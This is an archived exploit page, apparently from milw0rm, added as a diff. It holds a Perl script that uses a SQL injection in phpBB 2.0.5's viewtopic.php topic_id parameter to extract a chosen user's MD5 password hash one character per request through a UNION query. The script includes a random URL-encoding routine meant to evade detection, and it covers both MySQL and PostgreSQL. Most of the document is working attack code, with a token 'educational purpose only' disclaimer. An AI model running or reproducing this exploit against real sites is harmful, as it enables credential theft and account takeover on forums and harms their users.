@@ -1,0 +1,137 @@
+<html><head><title>phpBB 2.0.5 SQL Injection password disclosure Exploit
+</title></head><pre>#!/usr/bin/perl -w
+#
+#
+# phpBB password disclosure vuln.
+# - rick patel
+# 
+# There is a sql injection vuln which exists in /viewtopic.php file. The variable is $topic_id
+# which gets passed directly to sql server in query. Attacker could pass a special sql string which
+# can used to see md5 password hash for any user (!) for phpBB. This pass can be later used with
+# autologin or cracked using john. 
+#
+# Details: 
+#
+# this is checking done for $topic_id in viewtopic.php:
+#
+# if ( isset($HTTP_GET_VARS[POST_TOPIC_URL]) )
+# {
+# $topic_id = intval($HTTP_GET_VARS[POST_TOPIC_URL]);
+# }
+# else if ( isset($HTTP_GET_VARS['topic']) )
+# {
+# $topic_id = intval($HTTP_GET_VARS['topic']);
+# }
+#
+# ok... no else statement at end :)
+# now if GET[view]=newest and GET[sid] is set, this query gets executed:
+#
+# $sql = &quot;SELECT p.post_id
+# FROM &quot; . POSTS_TABLE . &quot; p, &quot; . SESSIONS_TABLE . &quot; s, &quot; . USERS_TABLE . &quot; u
+# WHERE s.session_id = '$session_id'
+# AND u.user_id = s.session_user_id
+# AND p.topic_id = $topic_id
+# AND p.post_time &gt;= u.user_lastvisit
+# ORDER BY p.post_time ASC
+# LIMIT 1&quot;;
+#
+# $topic_id gets passed directy to query. So how can we use this to do something important? Well
+# I decided to use union and create a second query will get us something useful. There were couple of 
+# problems i ran into. first, phpBB only cares about the first row returned. second, the select for first
+# query is p.post_id which is int, so int becomes the type returned for any other query in union. third,
+# there is rest of junk at end &quot; AND p.post_time &gt;= ...&quot; We tell mysql to ignore that by placing /* at end
+# of our injected query. So what query can we make that returns only int? 
+# this one =&gt; select ord(substring(user_password,$index,1)) from phpbb_users where user_id = $uid
+# Then all we have to do is query 32 times which $index from 1-32 and we get ord value of all chars of
+# md5 hash password. 
+#
+# I have only tested this with mysql 4 and pgsql . Mysql 3.x does not support unions so you would have to tweak
+# the query to do anything useful. 
+# 
+# This script is for educational purpose only. Please dont use it to do anything else. 
+#
+# To Fix this bug : http://www.phpbb.com/phpBB/viewtopic.php?t=112052
+
+use IO::Socket;
+
+$remote = shift || 'localhost';
+$view_topic = shift || '/phpBB2/viewtopic.php';
+$uid = shift || 2;
+$port = 80;
+
+$dbtype = 'mysql4'; # mysql4 or pgsql 
+
+
+print &quot;Trying to get password hash for uid $uid server $remote dbtype: $dbtype\n&quot;;
+
+$p = &quot;&quot;;
+
+for($index=1; $index&lt;=32; $index++)
+{
+$socket = IO::Socket::INET-&gt;new(PeerAddr =&gt; $remote,
+PeerPort =&gt; $port,
+Proto =&gt; &quot;tcp&quot;,
+Type =&gt; SOCK_STREAM)
+or die &quot;Couldnt connect to $remote:$port : $@\n&quot;;
+$str = &quot;GET $view_topic&quot; . &quot;?sid=1&amp;topic_id=-1&quot; . random_encode(make_dbsql()) .
+ &quot;&amp;view=newest&quot; . &quot; HTTP/1.0\n\n&quot;;
+
+print $socket $str;
+print $socket &quot;Cookie: phpBB2mysql_sid=1\n&quot;; # replace this for pgsql or remove it
+print $socket &quot;Host: $remote\n\n&quot;;
+
+while ($answer = &lt;$socket&gt;)
+{
+if ($answer =~ /Location:.*\x23(\d+)/) # Matches the Location: viewtopic.php?p=&lt;num&gt;#&lt;num&gt;
+{
+$p .= chr ($1);
+}
+}
+
+close($socket);
+}
+
+print &quot;\nMD5 Hash for uid $uid is $p\n&quot;;
+
+# random encode str. helps avoid detection
+sub random_encode
+{
+$str = shift;
+$ret = &quot;&quot;;
+for($i=0; $i&lt;length($str); $i++)
+{
+$c = substr($str,$i,1);
+$j = rand length($str) * 1000;
+
+if (int($j) % 2 || $c eq ' ')
+{
+$ret .= &quot;%&quot; . sprintf(&quot;%x&quot;,ord($c));
+}
+else
+{
+$ret .= $c;
+}
+}
+return $ret;
+}
+
+sub make_dbsql
+{
+if ($dbtype eq 'mysql4')
+{
+return &quot; union select ord(substring(user_password,&quot; . $index . &quot;,1)) from phpbb_users where user_id=$uid/*&quot; ;
+} elsif ($dbtype eq 'pgsql')
+{
+return &quot;; 
+select ascii(substring(user_password from $index for 1)) as 
+post_id from phpbb_posts p, phpbb_users u where u.user_id=$uid or false&quot;;
+}
+else 
+{
+return &quot;&quot;;
+}
+}
+
+
+
+# milw0rm.com [2003-06-20]</pre></html>
